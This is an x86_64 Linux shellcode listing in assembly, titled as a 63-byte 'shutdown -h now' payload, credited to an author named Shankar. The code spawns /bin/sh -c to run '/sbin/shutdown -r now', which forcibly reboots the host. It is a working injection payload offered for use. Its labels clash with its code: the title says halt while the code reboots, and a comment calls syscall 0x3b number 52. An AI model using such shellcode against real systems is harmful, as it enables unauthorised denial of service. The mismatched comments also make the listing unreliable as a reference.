; Title: shutdown -h now x86_64 Shellcode - 63 bytes
; Platform: linux/x86_64
; Author: Shankar

section .text

global _start

_start:


                push 0x3b                       ; push 52 execve syscall
                pop rax
                cdq
                mov rbx, 0x68732f6e69622f       ; mov /bin/sh to rbx

                push rbx
                mov rdi, rsp
                push 0x632d                     ; -c
                mov rsi, rsp
                push rdx

                call poppy
                db '/sbin/shutdown -r now \n'

poppy:
                push rsi
                push rdi
                mov rsi, rsp                    ; command construct - /bin/sh -c /sbin/shutdown -r now \n"
                syscall
